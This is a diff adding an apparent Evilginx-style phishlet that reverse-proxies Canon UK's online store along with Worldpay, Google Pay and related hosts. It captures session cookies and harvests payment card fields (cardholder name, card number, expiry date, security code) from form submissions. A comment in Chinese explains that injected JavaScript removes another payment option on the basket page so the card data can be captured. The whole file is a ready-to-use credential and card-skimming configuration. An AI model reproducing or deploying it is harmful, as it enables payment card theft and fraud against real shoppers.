@@ -1,0 +1,56 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'canon.co.uk', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'canon.co.uk', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'hpp', orig_sub: 'hpp', domain: 'worldpay.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'payments', orig_sub: 'payments', domain: 'worldpay.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'cquotient.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api2', orig_sub: 'api', domain: 'ipify.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apps', orig_sub: 'apps', domain: 'bazaarvoice.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'i1', orig_sub: 'i1', domain: 'adis.ws', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.canon.co.uk', orig_sub: 'www', domain: 'canon.co.uk', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ]}
+  - {triggers_on: 'apps.bazaarvoice.com', orig_sub: 'apps', domain: 'bazaarvoice.com', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - {triggers_on: 'payments.worldpay.com', orig_sub: 'payments', domain: 'worldpay.com', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - {triggers_on: 'pay.google.com', orig_sub: 'pay', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+
+# 干掉其他支付类型，不然就抓不到数据了
+js_inject:
+  - trigger_domains: ["www.canon.co.uk"]
+    trigger_paths: ["/store/basket"]
+    script: |
+      (function() {
+        $(".chakra-radio-group > div:nth-child(2)").remove()
+      })()
+auth_tokens:
+  - domain: 'www.canon.co.uk'
+    keys: [ 'usid_canon-uk','cc-nx-g_canon-uk']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'cardholderName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'securityCode'
+    search: '([0-9]*)'
+    type: 'post'
+  custom:
+    - key: 'expiryDate.expiryMonth'
+      search: '([0-9]*)'
+      type: 'post'
+    - key: 'expiryDate.expiryYear'
+      search: '([0-9]*)'
+      type: 'post'
+    - key: 'securityCode'
+      search: '([0-9]*)'
+      type: 'post'
+    - key: 'cardNumber'
+      search: '([0-9]*)'
+      type: 'post'
+login:
+  domain: 'www.canon.co.uk'
+  path: '/store/canon-eos-r6-mark-ii-mirrorless-camera-rf-24-105mm-f4l-is-usm-lens/5666C032/'
